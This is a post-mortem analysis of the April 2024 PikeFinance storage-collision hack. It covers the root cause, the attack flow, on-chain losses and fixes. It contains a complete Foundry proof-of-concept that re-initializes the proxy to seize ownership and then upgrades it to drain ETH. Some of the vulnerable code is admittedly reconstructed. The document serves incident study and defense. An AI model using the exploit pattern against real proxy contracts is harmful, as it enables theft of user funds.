# PikeFinance — Storage Collision Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04-30 |
| **Protocol** | PikeFinance (Cross-Chain Lending Protocol) |
| **Chain** | Ethereum (+ Arbitrum, Optimism spokes) |
| **Loss** | $1,695,841 (479.39 ETH + 99,970.48 ARB + 64,126 OP) |
| **Attacker** | [0x1906...e23](https://etherscan.io/address/0x19066f7431df29a0910d287c8822936bb7d89e23) |
| **Attack Contract** | [0x1da4...fbd](https://etherscan.io/address/0x1da4bc596bfb1087f2f7999b0340fcba03c47fbd) |
| **Attack Tx (ETH)** | [0xe291...431](https://etherscan.io/tx/0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431) |
| **Attack Tx (ARB)** | [0xdac6...157](https://arbiscan.io/tx/0xdac6af5695ba00b3d229574dbf7fcc326d16b9f8a52ad2620637d3022956d157) |
| **Attack Tx (OP)** | [0x6baa...f6f](https://optimistic.etherscan.io/tx/0x6baa6332f9a3ed75e727311d6317fb636844d61d9df5e199f9f68711eb632d6f) |
| **Vulnerable Contract** | [0xFC75...063](https://etherscan.io/address/0xfc7599cffea9de127a9f9c748ccb451a34d2f063) |
| **Root Cause** | Storage layout change after upgrade shifted the `initialized` variable slot → unauthorized re-invocation of the initializer function |
| **Classification** | Uninitialized Proxy / Storage Collision |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/PikeFinance_exp.sol) |

---

## 1. Vulnerability Overview

PikeFinance is a cross-chain lending protocol leveraging CCTP (Cross-Chain Transfer Protocol) with a hub-spoke architecture. The "spoke" contracts on each chain were deployed using the UUPS (Universal Upgradeable Proxy Standard) pattern.

On April 26, 2024, in response to a first CCTP verification bypass attack ($300K), the protocol team upgraded the spoke contracts by adding `pause()`/`unpause()` functions to emergency-pause the protocol. **This upgrade became the root cause of the second attack (April 30).**

Introducing the `pause()`/`unpause()` functions required a new inheritance dependency (a Pausable-family contract), which **changed the storage layout**. In particular, the slot position of the `initialized` variable — which tracks whether initialization has occurred — shifted, causing the slot that previously held `initialized = true` to be mapped to a different variable. As a result, the proxy contract perceived itself as "uninitialized," and the attacker was able to re-invoke the `initialize()` function to seize ownership, then install a malicious implementation contract via `upgradeToAndCall()` and drain all funds.

### Core Vulnerability Chain

| Vulnerability | Description |
|--------|------|
| Storage Collision | New dependency added during upgrade reshuffled state variable slots |
| Initializer Re-entry | `initialized` slot corruption bypasses initialization guard |
| Privilege Takeover | Attacker overwrites the owner slot to gain upgrade authority |

---

## 2. Vulnerable Code Analysis

### 2.1 Storage Layout Collision (Core Vulnerability)

Storage layout changes in the spoke contract before and after the upgrade:

```solidity
// ❌ Vulnerable structure — before upgrade (normal state)
contract SpokeV1 {
    uint8 private _initialized;     // slot 0 ← initialized = 1 (initialization complete)
    bool private _initializing;     // slot 0 (packed)
    address public owner;           // slot 1
    address public WNativeAddress;  // slot 2
    // ...
}

// ❌ Vulnerable structure — after upgrade (Pausable added)
contract SpokeV2 is PausableUpgradeable {
    // PausableUpgradeable uses slot 0 for _paused!
    bool private _paused;           // slot 0 ← overwrites the former _initialized slot!
    // _initialized is pushed from slot 0 to another slot
    uint8 private _initialized;     // slot 1 ← value is 0 (uninitialized)!
    bool private _initializing;     // slot 1 (packed)
    address public owner;           // slot 2
    // ...
}
```

**Problem**: After the upgrade, the slot of `_initialized` changes and its value is read as `0`. OpenZeppelin's `Initializable` considers `_initialized > 0` as initialized, so changing the slot disables the initialization guard.

### 2.2 Unprotected initialize Function

```solidity
// ❌ Vulnerable code — initialize function (post-upgrade state)
function initialize(
    address _owner,
    address _WNativeAddress,
    address _uniswapHelperAddress,
    address _tokenAddress,
    uint16 _swapFee,
    uint16 _withdrawFee
) external {
    // Danger: initializer modifier is nullified due to storage collision
    // _initialized slot has changed and is always read as 0 → re-invocation allowed!
    __Ownable_init();          // sets owner to msg.sender (the attacker)
    __Pausable_init();
    owner = _owner;            // ❌ overwritten with attacker's address
    WNativeAddress = _WNativeAddress;
    // ...
}
```

```solidity
// ✅ Fixed code — proper initialization guard
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract SpokeV2 is Initializable, OwnableUpgradeable, PausableUpgradeable {
    // ✅ Storage gap prevents slot collisions in future upgrades
    uint256[50] private __gap;

    function initialize(
        address _owner,
        address _WNativeAddress,
        address _uniswapHelperAddress,
        address _tokenAddress,
        uint16 _swapFee,
        uint16 _withdrawFee
    ) external initializer {  // ✅ initializer modifier fully blocks re-invocation
        __Ownable_init(_owner);
        __Pausable_init();
        // ...
    }
}
```

### 2.3 upgradeToAndCall Authorization Check Bypass

```solidity
// ❌ Vulnerable code — upgradeToAndCall
function upgradeToAndCall(
    address newImplementation,
    bytes memory data
) external {
    // onlyOwner check → passes because the attacker is already owner!
    require(msg.sender == owner, "Not owner");
    // Write new implementation address to EIP-1967 slot
    assembly {
        sstore(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, newImplementation)
    }
    // If data is present, delegatecall to the new implementation
    if (data.length > 0) {
        // ❌ Executes withdraw() on attacker's contract → drains all funds
        (bool success,) = newImplementation.delegatecall(data);
        require(success, "upgrade call failed");
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker pre-deploys a malicious contract implementing the `proxiableUUID()` function
- That contract contains logic to transfer ETH to the attacker via a `withdraw(address)` function
- Prepares the `proxiableUUID()` return value required by the UUPS proxy (EIP-1967 slot hash)

### 3.2 Execution Phase

**Step 1**: Attacker re-invokes `initialize()` on the proxy whose `initialized = 0` due to the storage collision

**Step 2**: `initialize()` execution completes, writing `owner = attacker address`

**Step 3**: Attacker calls `upgradeToAndCall(maliciousContract, withdraw(attacker))` with owner privileges

**Step 4**: Proxy upgrades to malicious contract; `withdraw()` delegatecall drains all funds

### 3.3 Attack Flow Diagram

```
Attacker EOA (0x1906...e23)
    │
    │  [1] call initialize(attacker, ...)
    ▼
┌─────────────────────────────────────────┐
│  PikeFinance Proxy (0xFC75...063)       │
│  EIP-1967 UUPS Proxy                    │
│                                         │
│  slot 0: _paused = false                │
│         (former _initialized slot       │
│          corrupted)                     │
│  → initialized check = 0 → re-init     │
│    allowed                              │
└─────────────────┬───────────────────────┘
                  │  delegatecall
                  ▼
┌─────────────────────────────────────────┐
│  Implementation Contract (SpokeV2)      │
│  initialize() executed                  │
│  → owner set to attacker address        │
└─────────────────────────────────────────┘
    │
    │  [2] call upgradeToAndCall(maliciousContract, withdraw(attacker))
    ▼
┌─────────────────────────────────────────┐
│  PikeFinance Proxy (0xFC75...063)       │
│  onlyOwner check → attacker = owner ✓  │
│  EIP-1967 slot → stores malicious       │
│  contract address                       │
└─────────────────┬───────────────────────┘
                  │  delegatecall → withdraw()
                  ▼
┌─────────────────────────────────────────┐
│  Malicious Contract (deployed by        │
│  attacker)                              │
│  withdraw(attacker):                    │
│  payable(attacker).call{value: balance} │
│  → drains entire ETH balance of proxy  │
└─────────────────────────────────────────┘
    │
    │  479.39 ETH → attacker wallet
    ▼
Attacker EOA (profit secured)

※ The same attack was repeated on Arbitrum (+99,970.48 ARB) and Optimism (+64,126 OP) spokes
```

### 3.4 Results

| Chain | Stolen Assets | USD Value |
|------|-----------|-----------|
| Ethereum | 479.39 ETH | ~$1,440,000 |
| Arbitrum | 99,970.48 ARB | ~$196,000 |
| Optimism | 64,126 OP | ~$59,000 |
| **Total** | | **~$1,695,841** |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

interface IPikeFinanceProxy {
    function initialize(address, address, address, address, uint16, uint16) external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract PikeFinance is Test {
    uint256 blocknumToForkFrom = 19_771_058; // attack block
    address constant PikeFinanceProxy = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;

    function setUp() public {
        vm.deal(address(this), 0);
        // [Step 0] Fork Ethereum mainnet (at attack block)
        vm.createSelectFork("mainnet", blocknumToForkFrom);
    }

    function testExploit() public {
        emit log_named_decimal_uint(" Attacker ETH Balance Before exploit", address(this).balance, 18);

        // [Step 1] Re-invoke initialize on the proxy where initialized = 0 due to storage collision
        // Set all parameters to the attacker contract (address(this))
        address _owner = address(this);             // ← attacker seizes owner
        address _WNativeAddress = address(this);
        address _uniswapHelperAddress = address(this);
        address _tokenAddress = address(this);
        uint16 _swapFee = 20;
        uint16 _withdrawFee = 20;
        IPikeFinanceProxy(PikeFinanceProxy).initialize(
            _owner, _WNativeAddress, _uniswapHelperAddress, _tokenAddress, _swapFee, _withdrawFee
        );

        // [Step 2] Upgrade to malicious implementation (address(this)) using owner privileges + immediately drain funds
        address newImplementation = address(this);
        bytes memory data = abi.encodeWithSignature("withdraw(address)", address(this));
        IPikeFinanceProxy(PikeFinanceProxy).upgradeToAndCall(newImplementation, data);
        // upgradeToAndCall executes withdraw() via delegatecall → drains all ETH

        emit log_named_decimal_uint(" Attacker ETH Balance After exploit", address(this).balance, 18);
    }

    // [Malicious function] Transfers proxy's ETH to attacker
    function withdraw(address addr) external {
        (bool success,) = payable(addr).call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    // For UUPS compatibility check — returns EIP-1967 implementation slot hash
    // upgradeToAndCall calls this function to validate the implementation contract
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Storage Layout Collision | CRITICAL | CWE-119 (Buffer Overflow/Memory Corruption) | `08_initialization.md` |
| V-02 | Initializer Re-invocation Allowed | CRITICAL | CWE-665 (Improper Initialization) | `08_initialization.md` |
| V-03 | Upgrade Privilege Takeover | CRITICAL | CWE-284 (Improper Access Control) | `03_access_control.md` |
| V-04 | Insufficient Upgrade Validation | HIGH | CWE-345 (Insufficient Data Authenticity Verification) | `08_initialization.md` |

### V-01: Storage Layout Collision

- **Description**: Adding `PausableUpgradeable` during the upgrade mapped `_paused` to slot 0, which previously held `_initialized`. As a result, `_initialized` is either unreadable or returns 0, nullifying the initialization guard.
- **Impact**: Anyone can re-invoke the `initialize()` function. Full ownership of the protocol can be seized.
- **Attack Condition**: The initialization guard slot is corrupted after the upgrade transaction executes.

### V-02: Initializer Re-invocation Allowed

- **Description**: Because `Initializable._initialized`'s slot returns `0` due to the collision, the `initializer` modifier's protection is bypassed. An attacker can call `initialize()` to set `owner` to their own address.
- **Impact**: Attacker gains full administrative control over the protocol.
- **Attack Condition**: Proxy contract uses the UUPS pattern and the `initialized` slot is corrupted.

### V-03: Upgrade Privilege Takeover

- **Description**: In the UUPS pattern, `upgradeToAndCall` enforces an `onlyOwner` check. However, because V-02 already placed the attacker in the `owner` slot, the check passes.
- **Impact**: Attacker can replace the proxy with an arbitrary malicious implementation contract and immediately drain funds.
- **Attack Condition**: V-01 and V-02 are prerequisites.

### V-04: Insufficient Upgrade Validation

- **Description**: Before upgrading, the storage layout of the new implementation contract was not validated for compatibility with the existing layout. The emergency patch was deployed to production without adequate auditing.
- **Impact**: An emergency upgrade response created an even larger vulnerability.
- **Attack Condition**: Absence of automated storage layout validation in the upgrade process.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Introduce Storage Gaps

```solidity
// ✅ Apply storage gaps to all upgradeable contracts
contract SpokeBase is Initializable, OwnableUpgradeable, PausableUpgradeable {
    // Gap to prevent storage slot collisions in future upgrades
    // Declared in the base class of the inheritance chain
    uint256[50] private __gap;
}
```

#### 6.2 Lock Implementation Contract Initialization

```solidity
// ✅ Prevent the implementation contract itself from being directly initialized
contract SpokeImplementation is SpokeBase {
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        // Permanently block direct initialization of the implementation contract
        _disableInitializers();
    }

    function initialize(
        address _owner,
        address _WNativeAddress,
        address _uniswapHelperAddress,
        address _tokenAddress,
        uint16 _swapFee,
        uint16 _withdrawFee
    ) external initializer {
        __Ownable_init(_owner);
        __Pausable_init();
        // ...
    }
}
```

#### 6.3 Safe Upgrades Using reinitializer

```solidity
// ✅ Use reinitializer(version) when upgrading
function initializeV2(
    // new parameters
) external reinitializer(2) {
    // Initialize only new variables while preserving existing state
    __Pausable_init(); // when Pausable is newly added
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Storage Collision | Use the `storage-layout` plugin to automatically diff layouts before and after upgrade |
| Initializer Re-invocation | Do not use `--unsafe-skip-storage-check` with the OpenZeppelin Upgrades Plugin |
| Emergency Upgrades | Mandatory Timelock + Multisig |
| Missing Storage Gap | Mandate the `uint256[50] private __gap` pattern in all upgradeable contracts |
| Upgrade Validation | Automate validation in CI/CD pipeline using `hardhat-upgrades` or `foundry-upgrades` |

### Code-Level Checklist

```
☑ Declare __gap in all upgradeable contracts
☑ Call _disableInitializers() in constructor
☑ Apply initializer or reinitializer modifier to initialize function
☑ Compare storage layout diff before upgrading
☑ All upgrades must go through Timelock + Multisig
☑ Emergency patches must also be deployed after audit (minimum internal security team review)
```

---

## 7. Lessons Learned

1. **An emergency patch can introduce a larger vulnerability**: The emergency upgrade in response to the first attack ($300K) became the cause of the second attack ($1.6M). Rushed patches must always undergo a security review.

2. **Storage layout changes are the most dangerous aspect of upgrades**: Adding new inherited contracts, reordering variables, and changing variable types can all destroy existing slot mappings. `validateUpgrade()` from `hardhat-upgrades` or `@openzeppelin/upgrades-core` must be integrated into CI as a mandatory step.

3. **`_disableInitializers()` is mandatory, not optional**: Implementation contracts in the UUPS pattern must call `_disableInitializers()` in their `constructor()`. This defends against direct initialization attacks on the implementation contract and re-initialization attacks caused by storage collisions.

4. **Cross-chain protocols multiply their attack surface by the number of chains**: The same vulnerability existed simultaneously on Ethereum, Arbitrum, and Optimism. A vulnerability in one spoke contract affects the entire ecosystem.

5. **Corruption of the `initialized` slot in a proxy pattern leads to full privilege takeover**: The `_initialized` slot of `Initializable` is the cornerstone protecting the entire ownership structure of the protocol. If this slot is corrupted by another variable, an attacker can freely change the `owner`.

6. **An emergency upgrade function without a timelock is a double-edged sword**: It allows the protocol to be patched quickly, but also allows an attacker to immediately exploit the seized owner privileges. Emergency upgrade functionality must be paired with a minimum delay and multisig.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| ETH Drained | Full proxy balance | 479.39 ETH | ✓ |
| Attack Block (ETH) | 19,771,058 | 19,771,058 | ✓ |
| Attacker Address | address(this) (PoC) | 0x19066f7431df29a0910d287c8822936bb7d89e23 | ✓ |

### 8.2 On-Chain Event Sequence (Ethereum Tx)

```
Tx: 0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431

1. initialize(attacker, ...) called → owner slot overwritten
2. upgradeToAndCall(maliciousContract, withdraw(attacker)) called
3. delegatecall → withdraw() executed
4. Transfer: PikeFinanceProxy → attacker, 479.39 ETH
```

### 8.3 Multi-Chain Attack Transactions

| Chain | Attack Tx | Stolen Assets |
|------|---------|-----------|
| Ethereum | [0xe291...431](https://etherscan.io/tx/0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431) | 479.39 ETH |
| Arbitrum | [0xdac6...157](https://arbiscan.io/tx/0xdac6af5695ba00b3d229574dbf7fcc326d16b9f8a52ad2620637d3022956d157) | 99,970.48 ARB |
| Optimism | [0x6baa...f6f](https://optimistic.etherscan.io/tx/0x6baa6332f9a3ed75e727311d6317fb636844d61d9df5e199f9f68711eb632d6f) | 64,126 OP |

> On-chain verification note: The source code of the vulnerable contract (0xFC75...063) is not verified on Etherscan, making it difficult to directly confirm the actual storage layout. The analysis above is reconstructed from the PoC code, publicly available post-mortem reports (Halborn, QuillAudits, CertiK), and transaction data.

---

## References

- [Halborn — Explained: The Pike Finance Hack (April 2024)](https://www.halborn.com/blog/post/explained-the-pike-finance-hack-april-2024)
- [QuillAudits — Decoding Pike Finance Exploit](https://quillaudits.medium.com/decoding-pike-finance-exploit-quillaudits-40a1662d3f8a)
- [CertiK — Pike Finance Incident Analysis](https://www.certik.com/resources/blog/pike-finance-incident-analysis)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/PikeFinance_exp.sol)
- [PikeFinance Official Statement (X)](https://x.com/PikeFinance/status/1785572875124330644)
- [Pattern Reference: 08_initialization.md](/home/gegul/skills/patterns/08_initialization.md)